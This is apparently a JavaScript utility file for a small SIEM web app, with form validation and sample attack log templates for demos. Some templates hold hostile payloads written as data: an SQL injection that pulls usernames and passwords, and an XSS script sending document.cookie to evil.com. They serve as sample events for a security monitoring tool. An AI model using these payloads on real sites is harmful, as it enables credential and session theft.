/**
 * Simpler SIEM - Client-side Utilities & Validation
 * Microsoft Theme Style
 */

// Validate Log Ingestion Form
function validateLogForm() {
    const sourceIp = document.getElementById("source_ip") ? document.getElementById("source_ip").value.trim() : "";
    const destIp = document.getElementById("dest_ip") ? document.getElementById("dest_ip").value.trim() : "";
    const port = document.getElementById("port") ? parseInt(document.getElementById("port").value, 10) : 0;
    const message = document.getElementById("message") ? document.getElementById("message").value.trim() : "";

    if (!sourceIp) {
        alert("Please enter a valid Source IP address.");
        document.getElementById("source_ip").focus();
        return false;
    }

    if (!destIp) {
        alert("Please enter a valid Destination IP address.");
        document.getElementById("dest_ip").focus();
        return false;
    }

    if (isNaN(port) || port < 1 || port > 65535) {
        alert("Port must be between 1 and 65535.");
        document.getElementById("port").focus();
        return false;
    }

    if (!message || message.length < 3) {
        alert("Please provide a descriptive log message or event payload.");
        document.getElementById("message").focus();
        return false;
    }

    return true;
}

// Validate Login Form
function validateLogin() {
    const user = document.getElementById("username") ? document.getElementById("username").value.trim() : "";
    const pass = document.getElementById("password") ? document.getElementById("password").value : "";

    if (!user) {
        alert("Please enter your Analyst Username.");
        document.getElementById("username").focus();
        return false;
    }
    if (!pass) {
        alert("Please enter your password.");
        document.getElementById("password").focus();
        return false;
    }
    return true;
}

// Quick fill attack templates in Log Ingestion form
function loadAttackTemplate(type) {
    const templates = {
        sqli: {
            source_ip: "185.220.101.99",
            dest_ip: "192.168.1.100",
            port: 80,
            protocol: "HTTP",
            event_type: "Web Attack",
            severity: "CRITICAL",
            username: "anonymous",
            message: "GET /search.php?q=admin' UNION SELECT 1,username,password FROM users--",
            action_taken: "Intercepted"
        },
        bruteforce: {
            source_ip: "198.51.100.77",
            dest_ip: "192.168.1.22",
            port: 22,
            protocol: "SSH",
            event_type: "Brute Force",
            severity: "HIGH",
            username: "root",
            message: "Failed login attempt for user root from 198.51.100.77 (Attempt 12/12)",
            action_taken: "Flagged"
        },
        portscan: {
            source_ip: "203.0.113.88",
            dest_ip: "192.168.1.1",
            port: 8080,
            protocol: "TCP",
            event_type: "Port Scan",
            severity: "MEDIUM",
            username: "scanner",
            message: "Port scan detected: sequential SYN probe on ports 21, 22, 25, 80, 443, 8080",
            action_taken: "Alerted"
        },
        xss: {
            source_ip: "192.168.1.55",
            dest_ip: "192.168.1.100",
            port: 80,
            protocol: "HTTP",
            event_type: "Web Attack",
            severity: "MEDIUM",
            username: "attacker",
            message: "POST /comment payload: <script>document.location='http://evil.com/steal?c='+document.cookie</script>",
            action_taken: "Blocked"
        },
        privilege: {
            source_ip: "192.168.1.110",
            dest_ip: "192.168.1.5",
            port: 22,
            protocol: "SSH",
            event_type: "Privilege Escalation",
            severity: "CRITICAL",
            username: "guest",
            message: "sudo su unauthorized execution detected by guest user without sudoers entry",
            action_taken: "Terminated"
        },
        benign: {
            source_ip: "192.168.1.120",
            dest_ip: "192.168.1.1",
            port: 443,
            protocol: "HTTPS",
            event_type: "Auth Success",
            severity: "INFO",
            username: "john.doe",
            message: "User john.doe authenticated successfully via MFA token.",
            action_taken: "Allowed"
        }
    };

    const t = templates[type];
    if (!t) return;

    if (document.getElementById("source_ip")) document.getElementById("source_ip").value = t.source_ip;
    if (document.getElementById("dest_ip")) document.getElementById("dest_ip").value = t.dest_ip;
    if (document.getElementById("port")) document.getElementById("port").value = t.port;
    if (document.getElementById("protocol")) document.getElementById("protocol").value = t.protocol;
    if (document.getElementById("event_type")) document.getElementById("event_type").value = t.event_type;
    if (document.getElementById("severity")) document.getElementById("severity").value = t.severity;
    if (document.getElementById("username")) document.getElementById("username").value = t.username;
    if (document.getElementById("message")) document.getElementById("message").value = t.message;
    if (document.getElementById("action_taken")) document.getElementById("action_taken").value = t.action_taken;

    // Flash message area to show preset loaded
    const msgBox = document.getElementById("message");
    if (msgBox) {
        msgBox.style.backgroundColor = "#eff6fc";
        setTimeout(() => {
            msgBox.style.backgroundColor = "#ffffff";
        }, 500);
    }
}
